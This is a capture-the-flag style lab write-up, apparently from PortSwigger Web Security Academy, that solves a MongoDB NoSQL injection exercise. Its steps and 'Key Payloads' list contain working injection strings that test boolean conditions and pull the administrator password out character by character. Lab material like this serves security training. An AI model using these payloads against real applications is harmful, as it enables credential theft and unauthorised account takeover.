## Exploiting NoSQL injection to extract data

**Category:** nosql
**Difficulty:** Medium

### Description
The user lookup functionality for this lab is powered by a MongoDB NoSQL database. It is vulnerable to NoSQL injection.

### Solution Steps
1. Login with valid credentials (wiener:peter) to understand the application
2. Find the user lookup endpoint: GET /user/lookup?user=wiener
3. Test for NoSQL injection by appending operators: `wiener'+'` (string concatenation)
4. Confirm injection with boolean conditions: `wiener' && '1'=='1` (returns user) vs `wiener' && '1'=='2` (returns "Could not find user")
5. Now target the administrator account - extract the password character by character
6. Use regex injection to test each character: `administrator' && this.password[0]=='a`
7. If the character is correct, the response will include user data; if wrong, "Could not find user"
8. Iterate through each position (0, 1, 2...) and each character (a-z, 0-9)
9. Build the password character by character until complete
10. Login as administrator with the extracted password

### Key Payloads
- `administrator`
- `wiener:peter`
- `GET /user/lookup?user=wiener`
- `user`
- `wiener'+'`
- `wiener' && '1'=='1`
- `wiener' && '1'=='2`
- `administrator' && this.password[0]=='a`
- `administrator' && this.password.match(/^a.*/)`

### Indicators of Success
- Boolean responses differ based on injected condition
- "Could not find user" indicates false condition
- User data returned indicates true condition
- Full password extracted enables admin login

---
*Source: PortSwigger Web Security Academy*
